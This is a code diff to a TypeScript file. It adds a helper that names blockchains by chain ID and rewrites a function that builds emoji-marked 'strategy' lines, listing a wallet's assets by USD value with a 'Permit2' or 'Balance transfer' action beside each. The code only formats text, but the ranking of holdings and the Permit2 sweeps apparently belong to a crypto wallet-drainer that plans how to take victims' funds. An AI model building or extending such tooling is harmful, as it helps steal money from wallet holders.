@@ -434,38 +434,59 @@ export type StrategyAsset = {
   amount_usd: number
 }
 
+function formatChainLabel(chain: string, symbol?: string): string {
+  const lower = chain.toLowerCase()
+  const evmMatch = lower.match(/^evm:(\d+)$/)
+  if (evmMatch) {
+    const id = Number(evmMatch[1])
+    const names: Record<number, string> = {
+      1: 'Ethereum',
+      56: 'BNB Chain',
+      137: 'Polygon',
+      42161: 'Arbitrum',
+      8453: 'Base',
+      10: 'Optimism',
+      43114: 'Avalanche',
+      250: 'Fantom',
+      25: 'Cronos',
+      100: 'Gnosis',
+      42220: 'Celo',
+      324: 'zkSync Era',
+      59144: 'Linea',
+      534352: 'Scroll',
+      81457: 'Blast',
+      5000: 'Mantle',
+    }
+    const chainName = names[id] ?? `EVM chain ${id}`
+    const sym = symbol && symbol !== 'native' ? symbol.toUpperCase() : ''
+    return sym ? `${chainName} · ${sym}` : chainName
+  }
+  if (lower.startsWith('solana') || lower === 'svm') {
+    const sym = symbol ? ` · ${symbol.toUpperCase()}` : ''
+    return `Solana${sym}`
+  }
+  if (lower.startsWith('tron')) return symbol ? `Tron · ${symbol.toUpperCase()}` : 'Tron'
+  if (lower.startsWith('bip122') || lower === 'btc' || lower === 'utxo') {
+    return symbol ? `Bitcoin · ${symbol.toUpperCase()}` : 'Bitcoin'
+  }
+  if (lower.startsWith('ton')) return symbol ? `TON · ${symbol.toUpperCase()}` : 'TON'
+  const base = chain.replace(/^[^:]+:/, '').toUpperCase()
+  return symbol ? `${base} · ${symbol.toUpperCase()}` : base
+}
+
 function buildStrategyLines(assets: StrategyAsset[], totalUsd: number): string {
   if (!assets || assets.length === 0) return ''
 
-  type ChainBucket = { erc20Count: number; erc20Usd: number; nativeUsd: number }
-  const byChain = new Map<string, ChainBucket>()
-
-  for (const a of assets) {
-    if (a.amount_usd <= 0) continue
-    const chainKey = a.chain.toLowerCase()
-    if (!byChain.has(chainKey)) byChain.set(chainKey, { erc20Count: 0, erc20Usd: 0, nativeUsd: 0 })
-    const bucket = byChain.get(chainKey)!
+  const lines: string[] = []
+  const sorted = [...assets].filter((a) => a.amount_usd > 0).sort((a, b) => b.amount_usd - a.amount_usd)
+  for (const a of sorted.slice(0, 12)) {
+    const label = formatChainLabel(a.chain, a.symbol)
     const isNative =
       !a.token ||
       a.token === 'native' ||
       a.token.toLowerCase() === '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee'
-    if (isNative) {
-      bucket.nativeUsd += a.amount_usd
-    } else {
-      bucket.erc20Count++
-      bucket.erc20Usd += a.amount_usd
-    }
-  }
-
-  const lines: string[] = []
-  for (const [chain, b] of byChain) {
-    const label = chain.toUpperCase()
-    if (b.erc20Count > 0) {
-      lines.push(`👉 ${label} — 🔥 Permit2 Batch (${b.erc20Count} token${b.erc20Count > 1 ? 's' : ''}) $${b.erc20Usd.toFixed(2)}`)
-    }
-    if (b.nativeUsd > 0) {
-      lines.push(`👉 ${label} — Balance transfer $${b.nativeUsd.toFixed(2)}`)
-    }
+    const action = isNative ? 'Balance transfer' : `Permit2 · ${(a.symbol || 'token').toUpperCase()}`
+    lines.push(`👉 ${label} — ${action} $${a.amount_usd.toFixed(2)}`)
   }
 
   if (lines.length === 0) return ''
